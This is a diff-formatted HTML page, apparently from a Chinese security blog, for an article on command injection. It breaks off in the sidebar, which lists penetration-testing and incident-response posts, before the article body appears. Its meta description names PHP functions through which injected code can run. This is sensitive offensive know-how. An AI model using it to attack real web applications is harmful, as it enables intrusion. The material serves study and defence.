@@ -1,0 +1,773 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <meta charset="utf-8">
+    
+    <title>命令注入漏洞 | wintrysec</title>
+    
+    
+        <meta name="keywords" content="命令注入漏洞" />
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="代码执行：可执行脚本语言代码 命令执行：可执行系统(Linux、windows)命令  PHP敏感函数代码执行eval()		&#x2F;&#x2F;把字符串作为PHP代码执行assert()	&#x2F;&#x2F;检查一个断言是否为 FALSE，可用来执行代码preg_replace()	&#x2F;&#x2F;执行一个正则表达式的搜索和替换call_user_func()&#x2F;&#x2F;把第一个参数作为回调函数调用call_user_func_array()&#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="命令注入漏洞">
+<meta property="og:url" content="https://wintrysec.github.io/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="wintrysec">
+<meta property="og:description" content="代码执行：可执行脚本语言代码 命令执行：可执行系统(Linux、windows)命令  PHP敏感函数代码执行eval()		&#x2F;&#x2F;把字符串作为PHP代码执行assert()	&#x2F;&#x2F;检查一个断言是否为 FALSE，可用来执行代码preg_replace()	&#x2F;&#x2F;执行一个正则表达式的搜索和替换call_user_func()&#x2F;&#x2F;把第一个参数作为回调函数调用call_user_func_array()&#x2F;">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-08-12T12:09:03.000Z">
+<meta property="article:modified_time" content="2020-12-07T06:49:09.105Z">
+<meta property="article:author" content="wintrysec">
+<meta name="twitter:card" content="summary">
+    
+
+    
+        <link rel="alternate" href="/atom.xml" title="wintrysec" type="application/atom+xml" />
+    
+
+    
+        <link rel="icon" href="/favicon.ico" />
+    
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/libs/open-sans/styles.css">
+
+    
+<link rel="stylesheet" href="/libs/source-code-pro/styles.css">
+
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<script src="/libs/jquery/2.1.3/jquery.min.js"></script>
+
+    
+<script src="/libs/jquery/plugins/cookie/1.4.1/jquery.cookie.js"></script>
+
+    
+    
+        
+<link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">
+
+    
+    
+        
+<link rel="stylesheet" href="/libs/justified-gallery/justifiedGallery.min.css">
+
+    
+    
+    
+    
+
+
+    
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+    <div id="container">
+        <header id="header">
+    <div id="header-main" class="header-inner">
+        <div class="outer">
+            <a href="/" id="logo">
+                <i class="logo"></i>
+                <span class="site-title">wintrysec</span>
+            </a>
+            <nav id="main-nav">
+                
+                    <a class="main-nav-link" href="/about">关于</a>
+                
+            </nav>
+            
+            <div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="Search" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="Type something..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+</div>
+        </div>
+    </div>
+    <div id="main-nav-mobile" class="header-sub header-inner">
+        <table class="menu outer">
+            <tr>
+                
+                    <td><a class="main-nav-link" href="/about">关于</a></td>
+                
+                <td>
+                    
+    <div class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="Search" />
+    </div>
+
+                </td>
+            </tr>
+        </table>
+    </div>
+</header>
+
+        <div class="outer">
+            
+            
+                <aside id="sidebar">
+   
+        
+    <div class="widget-wrap" id='categories'>
+        <h3 class="widget-title">
+            <span>categories</span>
+            &nbsp;
+            <a id='allExpand' href="#">
+                <i class="fa fa-angle-double-down fa-2x"></i>
+            </a>
+        </h3>
+        
+        
+        
+         <ul class="unstyled" id="tree" > 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            【0】基础知识
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/08/12/%E3%80%900%E3%80%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/0%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E5%B8%B8%E8%AF%86/">【0】网络安全设备常识</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%900%E3%80%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/1%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E4%B9%8B%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6/">【1】现代密码学常识</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%900%E3%80%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/2%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%8BWeb%E5%8A%9F%E8%83%BD/">【2 网络基础】Web应用常识</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%900%E3%80%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%8BTCP&IP/">【3 网络基础】TCP/IP协议</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%900%E3%80%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/4%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%8BHTTP/">【4 网络基础】HTTP协议</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%900%E3%80%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/5%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%8BSSL%E5%8F%8C%E5%90%91%E8%AE%A4%E8%AF%81/">【5 网络基础】SSL双向认证</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%900%E3%80%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/6%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%8B%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AE/">【6 网络基础】路由协议</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%900%E3%80%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/7%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8BLinux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/">【7 操作系统】Linux基础命令</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%900%E3%80%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/8%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8BLinux%E4%B8%89%E5%89%91%E5%AE%A2/">【8 操作系统】Linux三剑客</a></li>  <li class="file"><a href="/2020/12/03/%E3%80%900%E3%80%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/10Docker%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%9E%84%E5%BB%BA%E6%8C%87%E5%8D%97/">Docker微服务构建指南</a></li>  <li class="file"><a href="/2020/12/03/%E3%80%900%E3%80%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/11Flask%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/">Flask开发快速入门笔记</a></li>  <li class="file"><a href="/2020/12/03/%E3%80%900%E3%80%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/9Git%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/">Git基本用法</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory open">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder-open"></i>
+                            &nbsp;
+                            【1】Web安全
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">SQL注入漏洞</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/">XSS跨站脚本攻击</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">XML实体注入漏洞</a></li>  <li class="file active"><a href="/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">命令注入漏洞</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">文件上传漏洞</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86%E6%BC%8F%E6%B4%9E/">文件处理漏洞</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/">请求伪造漏洞</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E5%92%8C%E5%9F%9F%E5%AE%89%E5%85%A8/">同源策略和域安全</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/">逻辑漏洞挖掘</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E6%80%BB%E7%BB%93/">源码泄露总结</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/">未授权访问总结</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">反序列化漏洞</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86%E6%BC%8F%E6%B4%9E/">会话管理漏洞</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8-CLRF+SSTI/">CLRF和SSTI模板注入</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8-PHP%E5%AE%89%E5%85%A8%E7%89%B9%E6%80%A7/">PHP安全特性</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8-%E4%B8%AD%E9%97%B4%E4%BA%BA%E5%92%8CARP%E6%AC%BA%E9%AA%97/">中间人攻击和ARP欺骗</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E4%B9%8BMySQL%E5%86%99shell/">MySQL写shell</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E4%B9%8BRedis/">Redis未授权访问利用</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E4%B9%8B%E5%8A%A0%E5%9B%BA/">数据库安全加固</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            【2】工具手册
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/03/%E3%80%902%E3%80%91%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C/Metasploit/">Metasploit漏洞利用框架</a></li>  <li class="file"><a href="/2020/12/03/%E3%80%902%E3%80%91%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C/%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C%E4%B9%8BBurpSuite/">BurpSuite简要手册</a></li>  <li class="file"><a href="/2020/12/03/%E3%80%902%E3%80%91%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C/%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C%E4%B9%8BNmap/">nmap端口扫描</a></li>  <li class="file"><a href="/2020/12/03/%E3%80%902%E3%80%91%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C/%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C%E4%B9%8Bsqlmap%E5%A4%87%E5%BF%98/">sqlmap简要手册</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            【3】渗透测试
+                        </a>
+                         <ul class="unstyled" id="tree" > 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            【1】边界资产信息收集
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/03/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%901%E3%80%91%E8%BE%B9%E7%95%8C%E8%B5%84%E4%BA%A7%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E8%BE%B9%E7%95%8C%E8%B5%84%E4%BA%A7%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">边界资产信息收集</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            【2】打点寻找内网入口
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/03/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%902%E3%80%91%E6%89%93%E7%82%B9%E5%AF%BB%E6%89%BE%E5%86%85%E7%BD%91%E5%85%A5%E5%8F%A3/%E5%B8%B8%E8%A7%84%E6%89%93%E7%82%B9/">边界打点寻找内网入口</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            【3】构建通道
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/03/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%903%E3%80%91%E6%9E%84%E5%BB%BA%E9%80%9A%E9%81%93/%E6%9E%84%E5%BB%BA%E9%80%9A%E9%81%93/">构建通道漫游内网</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            【4】权限维持
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/11/02/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%904%E3%80%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/">【1】文件传输</a></li>  <li class="file"><a href="/2020/12/03/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%904%E3%80%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/DNS%E4%B8%8A%E7%BA%BFC2/">【6】DNS上线CS</a></li>  <li class="file"><a href="/2020/12/03/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%904%E3%80%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/Webshell/">【3】WebShell</a></li>  <li class="file"><a href="/2020/12/03/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%904%E3%80%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E5%8F%8D%E5%BC%B9Shell/">【2】反弹shell</a></li>  <li class="file"><a href="/2020/12/03/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%904%E3%80%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">【4】权限提升</a></li>  <li class="file"><a href="/2020/12/03/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%904%E3%80%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E7%B3%BB%E7%BB%9F%E5%90%8E%E9%97%A8/">【5】系统后门</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            【5】横向移动
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/03/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%905%E3%80%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/Hash%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/">【3】Hash传递攻击</a></li>  <li class="file"><a href="/2020/12/03/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%905%E3%80%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">【1】内网信息收集</a></li>  <li class="file"><a href="/2020/12/03/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%905%E3%80%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF/">【6】指定主机上线</a></li>  <li class="file"><a href="/2020/12/03/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%905%E3%80%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E6%9C%AC%E6%9C%BA%E5%AF%86%E7%A0%81%E5%92%8C%E6%95%A3%E5%88%97%E5%80%BC%E8%8E%B7%E5%8F%96/">【2】本机密码和散列值获取</a></li>  <li class="file"><a href="/2020/12/03/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%905%E3%80%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/">【4】票据传递攻击</a></li>  <li class="file"><a href="/2020/12/03/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%905%E3%80%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/">【5】黄金票据和白银票据</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            【6】日志处理
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/03/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%906%E3%80%91%E6%97%A5%E5%BF%97%E5%A4%84%E7%90%86/%E6%97%A5%E5%BF%97%E5%A4%84%E7%90%86/">日志处理</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            【7 蓝队】防守策略
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/03/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%907%20%E8%93%9D%E9%98%9F%E3%80%91%E9%98%B2%E5%AE%88%E7%AD%96%E7%95%A5/%E3%80%90%E8%93%9D%E9%98%9F%E3%80%91%E9%98%B2%E5%AE%88%E7%AD%96%E7%95%A5/">【蓝队】2020攻防演练防守心得</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            【8 蓝队】基线加固
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/08/12/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%908%20%E8%93%9D%E9%98%9F%E3%80%91%E5%9F%BA%E7%BA%BF%E5%8A%A0%E5%9B%BA/Linux%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/">Linux安全加固</a></li>  <li class="file"><a href="/2020/08/12/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%908%20%E8%93%9D%E9%98%9F%E3%80%91%E5%9F%BA%E7%BA%BF%E5%8A%A0%E5%9B%BA/Windows%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/">Windows安全加固</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            【9 蓝队】应急响应
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/08/12/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%909%20%E8%93%9D%E9%98%9F%E3%80%91%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">【概念】应急响应模型</a></li>  <li class="file"><a href="/2020/12/03/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%909%20%E8%93%9D%E9%98%9F%E3%80%91%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">Linux入侵排查</a></li>  <li class="file"><a href="/2020/12/03/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%909%20%E8%93%9D%E9%98%9F%E3%80%91%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Webshell%E6%8E%92%E6%9F%A5/">Webshell排查</a></li>  <li class="file"><a href="/2020/12/03/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%909%20%E8%93%9D%E9%98%9F%E3%80%91%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">Windows入侵排查</a></li>  </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            【4】漏洞研究
+                        </a>
+                         <ul class="unstyled" id="tree" > 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            Apache-ActiveMQ
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/10/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Apache-ActiveMQ/apache-activemq/">Apache-ActiveMQ</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            Apache-Kylin
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/10/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Apache-Kylin/apache-kylin/">Apache-Kylin</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            Apache-Shiro
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/09/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Apache-Shiro/apache-shiro/">Apache-Shiro</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            Apache-Solr
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/09/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Apache-Solr/apache-solr/">Apache-Solr</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            Apache-Tomcat
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/09/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Apache-Tomcat/apache-tomcat/">Apache-Tomcat</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            Apache-httpd
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/09/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Apache-httpd/apache-httpd/">Apache-httpd</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            Apereo-CAS
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/10/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Apereo-CAS/apereo-cas/">Apereo-CAS</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            Exchange
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/11/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Exchange/exchange/">Exchange</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            F5-BIG-IP
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/10/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/F5-BIG-IP/big-ip/">F5-Big-IP</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            GitLab
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/11/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/GitLab/gitlab/">GitLab</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            IIS
+                        </a>
